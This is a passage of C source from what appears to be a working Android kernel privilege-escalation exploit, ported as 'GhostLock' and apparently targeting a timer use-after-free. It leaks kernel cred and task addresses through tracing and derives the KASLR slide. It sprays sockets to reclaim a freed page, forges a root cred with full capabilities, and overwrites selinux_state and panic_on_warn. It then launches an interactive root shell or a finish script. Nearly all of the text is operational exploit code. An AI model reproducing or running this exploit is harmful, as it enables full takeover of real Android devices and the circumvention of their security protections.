        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        logf("[-] plant%d victim not captured (recs=%d)\n", tag, nrec);
        return;
    }
    {
        int ns = 0, np = 0;
        unsigned long long base;

        base = plant_base(raw, (size_t)n, etid, ptrs, nrec, &ns, &np);
        if (!base)
            base = g_base;
        if (!base || base < BASE_MIN || base > BASE_MAX)
        {
            trace_stop();
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            logf("[-] plant%d bad base=%#llx ns=%d np=%d recs=%d\n",
                 tag, base, ns, np, nrec);
            return;
        }
        g_base = base;
        /*
         * The linear map is [base, 0xffffffc000000000) on this VA layout;
         * physical RAM is sparse and extends well past 16 GiB, so do not
         * bound by RAM size.  A pointer outside this window is a stale
         * kmem record or a mis-scanned site collision and must not shift
         * the victim index.
         */
        for (int i = 0; i < nrec; i++)
            if (ptrs[i] >= base && ptrs[i] < 0xffffffc000000000ULL)
                kept[nkeep++] = ptrs[i];
        logf("[+] plant%d base=%#llx slabs=%d pfns=%d recs=%d kept=%d\n",
             tag, base, ns, np, nrec, nkeep);
    }
    if (nkeep <= VICTIM_IDX)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        logf("[-] plant%d victim index missing (kept=%d)\n", tag, nkeep);
        return;
    }
    V = kept[VICTIM_IDX];
    vslab = V & ~0x1fffULL;
    for (int i = 0; i < nkeep; i++)
        if ((kept[i] & ~0x1fffULL) == vslab)
            slab_own++;
    pfn = (V - g_base) >> 12;
    slab_pfn = pfn & ~1ULL;
    g_slide = site0 - STATIC_TIMER_SITE;
    if (g_slide > SLIDE_MAX)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        logf("[-] plant%d slide=%#llx exceeds profile bound\n", tag, g_slide);
        return;
    }

    {
        size_t off = (size_t)((V & 0x1fff) + 0x78);

        payload = malloc(SOCKBUF);
        if (!payload)
        {
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            return;
        }
        if (mode == 2)
        {
            unsigned long long page = V & ~0x1fffULL;
            unsigned long long *c = (unsigned long long *)(payload + off);
            size_t blob = 0, cand[] = {0x1f00, 0x1000, 0x1800, 0x800,
                                       0x100, 0x0};
            int fit = 0;

            if (off + 0xb8 > 0x2000)
            {
                logf("[-] plant%d fake cred spills off=%#zx; retryable\n",
                     tag, off);
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            for (size_t i = 0; i < sizeof(cand) / sizeof(cand[0]); i++)
            {
                size_t b = cand[i];

                if (b + 0x40 > 0x2000)
                    continue;
                if (b + 0x40 <= off || off + 0xb8 <= b)
                {
                    blob = b;
                    fit = 1;
                    break;
                }
            }
            if (!fit)
            {
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            build_payload(payload, off, V + 0x78, target);
            /* c[0]=A (usage), c[1]=uid/gid will be dirtied by rb erase,
             * c[2]=suid/sgid = target, both fixed by later zero plants. */
            c[3] = 0; /* euid/egid */
            c[4] = 0; /* fsuid/fsgid */
            c[5] = 0; /* securebits */
            for (int i = 6; i <= 10; i++)
                c[i] = FULLCAP; /* inh/prm/eff/bset/ambient */
            *(unsigned long long *)(payload + off + 0x80) =
                page + blob; /* security */
            *(unsigned long long *)(payload + off + 0x88) =
                ROOT_USER_STATIC + g_slide;
            *(unsigned long long *)(payload + off + 0x90) =
                INIT_USER_NS_STATIC + g_slide;
            *(unsigned long long *)(payload + off + 0x98) =
                INIT_UCOUNTS_STATIC + g_slide;
            *(unsigned long long *)(payload + off + 0xa0) =
                INIT_GROUPS_STATIC + g_slide;
            *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF) =
                SELINUX_SID_KERNEL;
            *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF + 4) =
                SELINUX_SID_KERNEL;
            logf("[+] plant%d fake cred off=%#zx blob=%#zx sec=%#llx\n",
                 tag, off, blob, page + blob);
        }
        else
        {
            build_payload(payload, off, 0, target);
        }
        slab_usage("pre-exec");
        logf("[+] plant%d V=%#llx A=%#llx pfn=%#llx slab=%#llx slide=%#llx "
             "recs=%d slab_own=%d/32 base=%#llx\n",
             tag, V, V + 0x78, pfn, slab_pfn, g_slide, nrec, slab_own,
             g_base);
    }

    atomic_store(&g_burst, 0);
    atomic_store(&g_burst2, 0);
    atomic_store(&g_stop_spray, 0);
    {
        int per = g_pool_n / SPRAY_THREADS;

        for (int i = 0; i < SPRAY_THREADS; i++)
        {
            args[i].payload = payload;
            args[i].sock_first = i * per;
            args[i].sock_count = per;
            args[i].cpu = i;
            args[i].idx = i;
            atomic_store(&g_spray_tids[i], -1);
            pthread_create(&th[i], NULL, spray_thread, &args[i]);
        }
    }
    /*
     * Release the race without spray CPU contention; V is already captured,
     * so the burst can start immediately after the zombie appears.
     */
    glk_mark_armed_once();
    if (g_timer_go_w >= 0)
    {
        if (write(g_timer_go_w, "x", 1) != 1)
            logf("[-] timer go failed\n");
        close(g_timer_go_w);
        g_timer_go_w = -1;
    }

    siginfo_t si;
    if (wait_zombie(T, &si))
    {
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < SPRAY_THREADS; i++)
            pthread_join(th[i], NULL);
        trace_stop();
        logf("[-] plant%d no zombie; holding child\n", tag);
        g_held++;
        return;
    }
    logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
         tag, T, etid, si.si_code, si.si_status);
    if (si.si_code != CLD_KILLED)
    {
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < SPRAY_THREADS; i++)
            pthread_join(th[i], NULL);
        trace_stop();
        if (si.si_code == CLD_EXITED)
        {
            int st = 0;

            /* execve succeeded: no stale node, safe to reap and retry. */
            waitpid(T, &st, 0);
            logf("[-] plant%d exec succeeded (status=%d); retryable\n",
                 tag, si.si_status);
            res->retry = 1;
            free(payload);
            return;
        }
        logf("[-] plant%d reap status not SIGKILL; holding zombie\n", tag);
        g_held++;
        return;
    }
    atomic_store(&g_burst, 1);
    /*
     * Phase 1 is already spraying.  When the victim page is freed, release
     * phase 2 immediately; detecting the free before the allocation would
     * otherwise leave the page to the next caller.
     */
    long t1 = now_ms();
    int hit = 0;

    while (!hit && now_ms() - t1 < 15000)
    {
        for (int cpu = 0; cpu < 8 && !hit; cpu++)
        {
            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

            if (m <= 0)
                continue;
            if (scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
            {
                hit = 1;
            }
            else if (!free_seen &&
                     scan_page_free(raw, (size_t)m, slab_pfn))
            {
                free_seen = 1;
                atomic_store(&g_burst2, 1);
            }
        }
        if (!hit)
            usleep(50);
    }
    atomic_store(&g_stop_spray, 1);
    atomic_store(&g_burst2, 1);
    for (int i = 0; i < SPRAY_THREADS; i++)
        pthread_join(th[i], NULL);
    trace_stop();
    for (int cpu = 0; cpu < 8 && !hit; cpu++)
    {
        long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

        if (m > 0 && scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
            hit = 1;
    }
    logf("[+] plant%d free_seen=%d burst hit=%d after %ldms\n",
         tag, free_seen, hit, now_ms() - t1);
    if (!hit)
    {
        logf("[-] plant%d burst missed; holding zombie\n", tag);
        g_held++;
        return;
    }

    usleep(1000);
    int st = 0;
    waitpid(T, &st, 0);
    logf("[+] plant%d reaped status=%#x\n", tag, st);
    res->A = V + 0x78;
    res->ok = 1;
    logf("[+] plant%d write mode=%s target=%#llx\n", tag,
         mode == 2 ? "fake" : "zero", target);
    free(payload);
}

/*
 * The child execs this binary so that it owns a private real cred.  The exec
 * allocation is captured from the kmem trace; the child then blocks on fd 3
 * and reports readiness on fd 4.  On success it returns the cred address and
 * hands the pipe fds to the caller.
 */
static unsigned long long leak_cred(unsigned char *raw,
                                    pid_t *out_pid, int *out_go, int *out_st,
                                    int shell_mode,
                                    unsigned long long *task_out)
{
    for (int attempt = 0; attempt < 4; attempt++)
    {
        int go[2], st[2];
        pid_t p;
        long n;
        int c = 0, hello = 0, tc = 0;
        unsigned long long R = 0, site = 0, task = 0;

        if (pipe(go) || pipe(st))
            return 0;
        /*
         * Start tracing before fork so copy_process()'s task_struct
         * allocation is in the buffer.  The exec cred allocation follows.
         */
        trace_start();
        p = fork();
        if (p == 0)
        {
            int g2, s2;
            char ch;

            close(go[1]);
            close(st[0]);
            g2 = fcntl(go[0], F_DUPFD, 20);
            s2 = fcntl(st[1], F_DUPFD, 20);
            if (g2 < 0 || s2 < 0)
                _exit(125);
            close(go[0]);
            close(st[1]);
            dup2(g2, 3);
            close(g2);
            dup2(s2, 4);
            close(s2);
            pin(g_cpu);
            if (read(3, &ch, 1) != 1)
                _exit(126);
            {
                const char *cmode = shell_mode ? "shell" : (g_fake_stage ? "fake" : "verify");
                char *const av[] = {
                    (char *)"/proc/self/exe", (char *)"--params",
                    (char *)g_params_arg, (char *)"wait", (char *)cmode,
                    (char *)"--finish-script",
                    (char *)(g_finish_script != NULL ? g_finish_script : ""),
                    (char *)"--run-id",
                    (char *)(g_run_id != NULL ? g_run_id : ""), NULL};
                char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin", NULL};

                execve("/proc/self/exe", av, ep);
            }
            _exit(127);
        }
        if (p < 0)
        {
            close(go[0]);
            close(go[1]);
            close(st[0]);
            close(st[1]);
            return 0;
        }
        close(go[0]);
        close(st[1]);
        if (write(go[1], "A", 1) != 1)
            logf("[!] leak go write failed\n");
        usleep(50000);
        trace_stop();
        n = read_cpu(g_cpu, raw, 48u << 20);
        if (n > 0)
        {
            c = scan_cred_allocs(raw, (size_t)n, (int)p, &site, &R);
            tc = scan_task_allocs(raw, (size_t)n, getpid(), &task);
        }
        if (R && (!g_fake_stage || task))
        {
            struct pollfd pf = {.fd = st[0], .events = POLLIN};

            if (poll(&pf, 1, 2000) > 0 &&
                read(st[0], &hello, sizeof(hello)) == sizeof(hello) &&
                hello == CHILD_HELLO)
            {
                logf("[cred] attempt=%d child=%d R=%#llx site_low=%#llx "
                     "recs=%d task=%#llx task_recs=%d\n",
                     attempt, p, R, site & 0x1fffff, c, task, tc);
                *out_pid = p;
                *out_go = go[1];
                *out_st = st[0];
                *task_out = task;
                return R;
            }
        }
        logf("[cred] attempt=%d child=%d R=%#llx hello=%#x recs=%d "
             "task=%#llx task_recs=%d failed\n",
             attempt, p, R, hello, c, task, tc);
        close(go[1]);
        close(st[0]);
        kill(p, SIGKILL);
        waitpid(p, NULL, 0);
    }
    return 0;
}

static int wait_child_main(const char *mode)
{
    struct child_report rep;
    char ch;
    int hello = CHILD_HELLO;

    pin(g_cpu);
    if (write(4, &hello, sizeof(hello)) != sizeof(hello))
        _exit(130);
    if (read(3, &ch, 1) != 1)
        _exit(131);
    close(3);

    memset(&rep, 0, sizeof(rep));
    rep.magic = CHILD_MAGIC;
    rep.uid = (int)syscall(SYS_getuid);
    rep.euid = (int)syscall(SYS_geteuid);
    logf("[child] woke uid=%d euid=%d\n", rep.uid, rep.euid);
    if (rep.uid != 0)
    {
        rep.setuid_ret = -1;
        (void)write(4, &rep, sizeof(rep));
        close(4);
        logf("[-] child uid is not 0: cred write did not land\n");
        _exit(3);
    }

    if (!strcmp(mode, "fake"))
    {
        char run_env[96];
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            run_env, NULL};
        const char *script = (g_finish_script != NULL) ? g_finish_script : "";

        (void)write(4, &rep, sizeof(rep));
        close(4);
        logf("[fake] rooted victim uid=%d euid=%d; exec finish script\n",
             rep.uid, rep.euid);
        logf("GLK98260_FINISH_UID=%d\n", rep.uid);
        logf("GLK98260_FINISH_RUN_ID=%s\n",
             (g_run_id != NULL) ? g_run_id : "");
        if (script[0] != '\0' && access(script, R_OK) == 0)
        {
            (void)snprintf(run_env, sizeof(run_env), "GHOSTLOCK_RUN_ID=%s",
                           (g_run_id != NULL) ? g_run_id : "");
            {
                char *const av[] = {(char *)"sh", (char *)script, NULL};

                execve("/system/bin/sh", av, envp);
            }
            logf("[-] finish exec failed errno=%d\n", errno);
            logf("GLK98260_FINISH_ERROR=exec\n");
            _exit(126);
        }
        logf("GLK98260_FINISH_ERROR=script-missing\n");
        _exit(127);
    }

    /*
     * Plant 1 zeroes uid+gid only; egid is still 2000.  If it stays that way
     * across execve(), cap_bprm's setgid downgrade intersects permitted with
     * the old (empty) set and the expanded bset never becomes effective.
     */
    errno = 0;
    {
        long sg = syscall(SYS_setresgid, 0, 0, 0);

        logf("[child] setresgid(0)=%ld errno=%d\n", sg, errno);
    }
    errno = 0;
    rep.setuid_ret = (int)syscall(SYS_setuid, 0);
    rep.setuid_errno = errno;
    {
        uid_t ru = 0, eu = 0, su = 0;

        getresuid(&ru, &eu, &su);
        rep.ruid = (int)ru;
        rep.reuid = (int)eu;
        rep.rsuid = (int)su;
    }
    (void)write(4, &rep, sizeof(rep));
    close(4);
    logf("[child] setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
         rep.setuid_ret, rep.setuid_errno, rep.ruid, rep.reuid, rep.rsuid);
    if (rep.setuid_ret != 0)
    {
        logf("[-] setuid(0) failed; not running a shell\n");
        _exit(4);
    }

    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};

        if (!strcmp(mode, "shell"))
        {
            char *const av[] = {(char *)"sh", (char *)"-i", NULL};

            execve("/system/bin/sh", av, envp);
        }
        else
        {
            char *const av[] = {(char *)"sh", (char *)"-c",
                                (char *)"id; cat /proc/self/attr/current 2>/dev/null; "
                                        "echo ROOT_SHELL_OK",
                                NULL};

            execve("/system/bin/sh", av, envp);
        }
    }
    logf("[-] shell exec failed errno=%d\n", errno);
    _exit(5);
}

/** @return 1=finish 脚本路径合法（绝对 /data/local/tmp、长度有界）。 */
static int glk_valid_finish_script(const char *path)
{
    size_t n;

    if (path == NULL)
        return 0;
    n = strlen(path);
    if (n == 0U || n > 200U)
        return 0;
    return strncmp(path, "/data/local/tmp/", 16U) == 0;
}

/** @return 1=runId 合法（8..64 位 [A-Za-z0-9._-]）。 */
static int glk_valid_run_id(const char *id)
{
    size_t n;

    if (id == NULL)
        return 0;
    n = strlen(id);
    if (n < 8U || n > 64U)
        return 0;
    for (size_t i = 0U; i < n; i++)
    {
        char c = id[i];

        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
            (c >= '0' && c <= '9') || c == '.' || c == '_' || c == '-')
            continue;
        return 0;
    }
    return 1;
}

int main(int argc, char **argv)
{
    unsigned char *raw;
    const char *param_arg = NULL;
    const char *mode_arg = NULL;
    const char *pos[4] = {NULL, NULL, NULL, NULL};
    int npos = 0;
    int shell_mode = 0, leak_only = 0, ids_only = 0, want_setsid = 0;
    const char *preflight_fail;

    setvbuf(stdout, NULL, _IONBF, 0);

    /*
     * 上游语义：target 以 argv[0]="" 重入自身作为 exec 成功信号
     * （timer.c:1631-1632）。该路径不解析 params、不产生副作用，先于一切。
     */
    if (argv[0] && argv[0][0] == '\0')
        _exit(42);

    for (int i = 1; i < argc; i++)
    {
        if (!strcmp(argv[i], "--params") && i + 1 < argc)
            param_arg = argv[++i];
        else if (!strcmp(argv[i], "--mode") && i + 1 < argc)
            mode_arg = argv[++i];
        else if (!strcmp(argv[i], "--setsid"))
            want_setsid = 1;
        else if (!strcmp(argv[i], "--finish-script") && i + 1 < argc)
            g_finish_script = argv[++i];
        else if (!strcmp(argv[i], "--run-id") && i + 1 < argc)
            g_run_id = argv[++i];
        else if (npos < 4)
            pos[npos++] = argv[i];
    }

    /* 每构建参数是强制的：缺参/非法 ⇒ 具名 marker 后退出（未 armed）。 */
    if (param_arg == NULL)
    {
        logf(GLK_MARK_PREFLIGHT "=fail:missing-params\n");
        return 2;
    }
    g_params_arg = param_arg;
    {
        const char *reason = glk98260_params_parse(&P, param_arg);

        if (reason != NULL)
        {
            logf(GLK_MARK_PREFLIGHT "=fail:%s\n", reason);
            return 2;
        }
    }
    g_cpu = (int)P.cpu;
    if (npos > 0 && !strcmp(pos[0], "cpu") && npos > 1)
        g_cpu = atoi(pos[1]);

    /* child re-exec：`<exe> --params <S> wait <mode>`（上游 timer.c:1435-1439）。 */
    if (!mode_arg && npos > 0)
        mode_arg = pos[0];
    if (mode_arg != NULL && !strcmp(mode_arg, "wait"))
        return wait_child_main(npos > 1 ? pos[1] : "verify");
    if (mode_arg == NULL)
        mode_arg = "fake";
    if (!strcmp(mode_arg, "shell"))
        shell_mode = 1;
    else if (!strcmp(mode_arg, "ids"))
        ids_only = 1;
    else if (!strcmp(mode_arg, "leak"))
        leak_only = 1;
    else if (!strcmp(mode_arg, "fake"))
        g_fake_stage = 1;
    else if (strcmp(mode_arg, "real") != 0)
    {
        logf(GLK_MARK_PREFLIGHT "=fail:bad-mode\n");
        return 2;
    }
#ifndef GLK98260_ENABLE_DIAGNOSTIC
    if (ids_only || leak_only || shell_mode ||
        (!g_fake_stage && strcmp(mode_arg, "real") == 0))
    {
        logf(GLK_MARK_PREFLIGHT "=fail:diagnostic-disabled\n");
        return 2;
    }
#endif
    if (g_fake_stage && !glk_valid_finish_script(g_finish_script))
    {
        logf(GLK_MARK_PREFLIGHT "=fail:missing-finish-script\n");
        return 2;
    }
    if (g_fake_stage && !glk_valid_run_id(g_run_id))
    {
        logf(GLK_MARK_PREFLIGHT "=fail:missing-run-id\n");
        return 2;
    }

    raw = malloc(48u << 20);
    if (!raw)
    {
        logf(GLK_MARK_PREFLIGHT "=fail:malloc\n");
        return 1;
    }

    {
        struct rlimit rl;

        if (!getrlimit(RLIMIT_NOFILE, &rl))
        {
            rl.rlim_cur = rl.rlim_max;
            if (rl.rlim_cur > 65536)
                rl.rlim_cur = 65536;
            (void)setrlimit(RLIMIT_NOFILE, &rl);
        }
    }

    /* 可选自建会话（JNI POSIX_SPAWN_SETSID 不可用时的 fallback；wait 子进程不重复）。 */
    if (want_setsid && mode_arg != NULL && strcmp(mode_arg, "wait") != 0)
        (void)setsid();
    pin(g_cpu);
    logf("[+] pid=%d cpu=%d\n", getpid(), g_cpu);
    preflight_fail = glk_preflight_env();
    if (preflight_fail != NULL)
    {
        logf(GLK_MARK_PREFLIGHT "=fail:%s\n", preflight_fail);
        return 3;
    }
    enable_events();
    kick_rss();
    usleep(50000);

    if (discover_page_types(raw) != 0)
    {
        logf(GLK_MARK_PREFLIGHT "=fail:page-event-ids\n");
        return 1;
    }
    logf(GLK_MARK_PREFLIGHT "=ok\n");
    if (ids_only)
        return 0;

    g_base = calibrate_base(raw);
    if (!g_base || g_base < BASE_MIN || g_base > BASE_MAX)
    {
        logf("[-] base calibration failed/out-of-window\n");
        return 1;
    }
    prefill_timers(PREFILL_TIMERS);

    pid_t C = -1;
    int go_fd = -1, st_fd = -1;
    unsigned long long R = leak_cred(raw, &C, &go_fd, &st_fd, shell_mode,
                                     &g_child_task);
    if (!R)
    {
        logf("[-] cred leak failed\n");
        return 1;
    }
    logf("[+] child=%d cred=%#llx target=%#llx\n", C, R, R + 8);
    if (leak_only)
    {
        close(go_fd);
        close(st_fd);
        kill(C, SIGKILL);
        waitpid(C, NULL, 0);
        logf("[+] leak-only run complete\n");
        return 0;
    }
    ensure_pool();
    ensure_raw();

    if (!g_fake_stage)
    {
        struct plant_res r;

        memset(&r, 0, sizeof(r));
        for (int a = 0; a < 3 && !r.ok; a++)
        {
            logf("[+] plant attempt %d/3\n", a + 1);
            run_plant(R + CRED_UID_OFF, 1, 0, &r, raw);
        }
        if (!r.ok)
            park_forever("no successful plant");
    }
    else
    {
        struct plant_res fc;

        if (!g_child_task)
            park_forever("child task not leaked");
        memset(&fc, 0, sizeof(fc));
        if (!g_slide)
            park_forever("no KASLR slide");
        /*
         * GhostLock port 顺序（与上游相反，见文件头）：
         *   ② SELinux off → ③ panic_on_warn → ① fake_cred → ④ fake_uid。
         * 理由：fake_cred 的自指 erase 必然触发 RB_EMPTY_NODE WARN，而
         * panic_on_warn 只有在 SELinux 关闭后才可读/可写（timer.c:1708-1712）。
         */
        if (stage_write(SELINUX_STATE_STATIC + g_slide - 7, 0,
                        "selinux", raw, NULL))
            park_forever("selinux write failed");
        logf(GLK_MARK_SELINUX_OFF "=1\n");
        {
            int pow = read_panic_on_warn();

            logf(GLK_MARK_PANIC_ON_WARN "=%d\n", pow);
            if (pow != 0 &&
                stage_write(PANIC_ON_WARN_STATIC + g_slide, 0,
                            "panic_on_warn", raw, NULL))
                park_forever("panic_on_warn write failed");
        }
        if (stage_write(g_child_task + OFF_TASK_CRED, 2, "fake_cred",
                        raw, &fc))
            park_forever("fake cred write failed");
        logf(GLK_MARK_FAKE_CRED "=1\n");
        logf("[+] fake cred A=%#llx selinux_state=%#llx\n", fc.A,
             SELINUX_STATE_STATIC + g_slide);
        if (stage_write(fc.A + CRED_UID_OFF, 0, "fake_uid", raw, NULL))
            park_forever("fake uid fix failed");
        logf(GLK_MARK_FAKE_UID "=1\n");
    }
    logf("[+] cred writes landed, waking child\n");

    if (write(go_fd, "A", 1) != 1)
        logf("[!] child wake write failed\n");
    close(go_fd);

    {
        struct child_report rep;
        struct pollfd pf = {.fd = st_fd, .events = POLLIN};
        ssize_t rn = -1;

        if (poll(&pf, 1, 10000) > 0)
            rn = read(st_fd, &rep, sizeof(rep));
        close(st_fd);
        if (rn == (ssize_t)sizeof(rep) && rep.magic == CHILD_MAGIC)
        {
            logf("[+] child report uid=%d euid=%d setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
                 rep.uid, rep.euid, rep.setuid_ret, rep.setuid_errno,
                 rep.ruid, rep.reuid, rep.rsuid);
            if (rep.setuid_ret != 0 || rep.reuid != 0)
                logf("[!] child did not reach euid 0\n");
        }
        else
        {
            logf("[!] child report missing (n=%zd)\n", rn);
        }
    }

    {
        int st = 0;

        if (waitpid(C, &st, 0) == C)
        {
            logf("[+] child exit status=%#x\n", st);
            if (WIFEXITED(st))
                logf("GLK98260_FINISH_EXIT=%d\n", WEXITSTATUS(st));
            else if (WIFSIGNALED(st))
                logf("GLK98260_FINISH_EXIT=%d\n", 128 + WTERMSIG(st));
        }
    }
    if (g_fake_stage)
        park_forever("fake cred page held; reboot to clean");
    if (g_held)
        park_forever("root shell finished; failed-plant zombies are held");
    logf("[+] done\n");
    return 0;
}
